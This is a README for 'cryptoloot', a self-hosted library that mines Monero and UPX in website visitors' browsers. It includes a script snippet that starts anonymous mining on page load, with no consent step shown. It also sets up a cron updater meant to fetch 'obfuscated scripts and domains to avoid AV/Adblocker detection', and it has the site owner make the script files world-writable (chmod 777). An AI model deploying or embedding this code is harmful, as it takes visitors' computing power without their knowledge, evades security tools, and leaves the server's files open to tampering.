# cryptoloot

Self Hosted Library for CryptoLoot v3.0
=======================================

Working with Monero v10 (Cryptonight v4/CryptoNightR) March 9th, 2019 Hardfork Release
Also now works with UPXTWO Algorithm
========================================================================


How to Install:
1) Download https://github.com/Crypto-Loot/cryptoloot/archive/master.zip and uncompress at yoursite.com home directory
or alternatively use ```git clone https://github.com/Crypto-Loot/cryptoloot.git```
2) Register at https://crypto-loot.org to get your public site ID, you'll need this for the next step.
3) Add the script to your website, preferably ABOVE </body> tag, and not within the <head></head> tags. Make sure to edit YOUR_PUBLIC_KEY with your site ID from crypto-loot.org:
```text
<script src="lib/crypta.js"></script>
<script>
            var miner=new CRLT.Anonymous('YOUR_PUBLIC_KEY', {
                threads:4,autoThreads:false,throttle:0.2,coin: "xmr"
            });
        miner.start();
</script>
```
NOTE: Also, edit your site key above from the one you have on https://crypto-loot.org

4) All set. Now just send some traffic!

5) Optional: Set to automatically update (to stay up to date with the latest obfuscated scripts and domains to avoid AV/Adblocker detection):
Make sure to install php-curl extension on your server if it does not exist: 

***CentOS:***
```text
yum install php-curl
```
***Debian:***
```text
apt-get install php-curl
```
Change the permissions of these threee files to 777 so they can be overwritten on update:
```text
chmod 777 lib/crypta.js lib/version.txt
```
Install the cron to check for updates once every 12 hours:
```text
0 */12 * * * php /var/www/html/website/updater.php >> /var/www/html/website/cl_log.txt
```

Supported Coins:
===============
xmr: ```coin: xmr```
upx: ```coin: upx```
Mix of both upx & xmr (50/50): ```coin: xmrupx```

Have any questions?
===================
Feel free to contact as at https://crypto-loot.org
